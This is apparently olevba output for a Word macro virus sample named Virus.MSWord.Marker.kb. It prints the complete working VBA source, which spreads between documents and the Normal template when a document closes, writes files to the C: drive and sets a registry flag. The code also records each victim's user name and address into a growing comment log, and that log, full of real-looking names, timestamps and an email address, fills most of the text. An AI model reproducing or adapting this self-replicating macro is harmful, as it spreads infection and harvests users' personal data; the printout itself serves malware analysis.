olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
ListBox1.Text1 = "a"
End Sub

' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = True
    Options.ConfirmConversions = True
    Options.SaveNormalPrompt = True


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - ñðåäà, 3 ìàé 2000
' Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - âòîðíèê, 16 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - ÷åòâåðã, 18 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:33 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:13:04 - ñðåäà, 24 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:51:44 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:16 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:13 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:33 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:33:11 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:13:47 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:49:56 - ñðåäà, 28 èþí 2000
' Indi G.Ospanova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:26:40 - âòîðíèê, 18 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:22:23 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:33:06 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:01 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:34:42 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:27 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:05 - âòîðíèê, 25 èþë 2000
' CCTT
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:53:34 - ÷åòâåðã, 27 èþë 2000
' ðåàíèìàòîð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:37:06 - âòîðíèê, 1 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:46:13 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:22:38 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:38:46 - âòîðíèê, 22 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:24 - ïÿòíèöà, 25 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:34 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:22:22 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:55 - âòîðíèê, 10 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:48:10 - ÷åòâåðã, 19 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:24:45 - ñðåäà, 29 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:23:28 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:58:47 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:47 - ïÿòíèöà, 1 äåê 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:36:35 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:48 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:23:03 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:32:55 - ñðåäà, 10 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001
' Jordan
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:12 - ïÿòíèöà, 2 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:49:01 - ïÿòíèöà, 16 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:12:13 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:12 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:19 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:26 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:37 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:44 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:49 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:55 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:36:01 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:45:17 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:49:57 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:40:56 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:41:22 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:51:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:52 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:31:09 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:35:05 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:06:09 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:40:13 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:58:47 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:00:31 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:02:15 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:29:34 - âîñêðåñåíüå, 12 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:14:19 - ïÿòíèöà, 13 àïð 2001
' s
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:04 - óòîðàê, 17 àïð 2001
' Patient Of Dr.OGen
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:55:25 - ñðåäà, 25 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:05 - ÷åòâåðã, 26 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:39:32 - ÷åòâåðã, 26 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:36:42 - ÷åòâåðã, 26 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:58:35 - ÷åòâåðã, 26 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:42:46 - ñðåäà, 2 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:29:54 - ÷åòâåðã, 3 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:46:37 - ÷åòâåðã, 3 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:21:52 - ÷åòâåðã, 3 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:28:18 - ïîíåäåëüíèê, 7 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:11:58 - âòîðíèê, 8 ìàé 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:13:51 - ïÿòíèöà, 11 ìàé 2001
' Smok
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:01 - ïîíåäåëüíèê, 14 ìàé 2001
' Smok
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:15:10 - ïîíåäåëüíèê, 14 ìàé 2001
' Smok
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:29:14 - ñóááîòà, 12 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:27:44 - ñóááîòà, 12 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:29:59 - âîñêðåñåíüå, 13 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:18:10 - ïîíåäåëüíèê, 14 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 04:15:41 - ïîíåäåëüíèê, 14 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 04:18:46 - ïîíåäåëüíèê, 14 ìàé 2001
' êàáèíåò èíôîðìàòèêè
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:30:46 - ñðåäà, 23 ìàé 2001
' Èíôîðì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 06:15:15 - ïîíåäåëüíèê, 4 èþí 2001
' Èíôîðì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:21:56 - ïÿòíèöà, 8 èþí 2001
' Èíôîðì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:54:42 - ïÿòíèöà, 8 èþí 2001
' Èíôîðì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:05:14 - âòîðíèê, 17 èþë 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 06:45:35 - ñðåäà, 18 èþë 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:49:23 - ïÿòíèöà, 20 èþë 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:06:21 - ïÿòíèöà, 24 àâã 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:53:32 - ñðåäà, 29 àâã 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:58 - âîñêðåñåíüå, 2 ñåí 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:51:32 - ÷åòâåðã, 6 ñåí 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 06:24:12 - ïÿòíèöà, 12 îêò 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:21:09 - ñðåäà, 17 îêò 2001
' Êàéíàð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:02:24 - ïÿòíèöà, 11 ÿíâ 2002
' fayer
' aku@tanak-cakap.com


' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
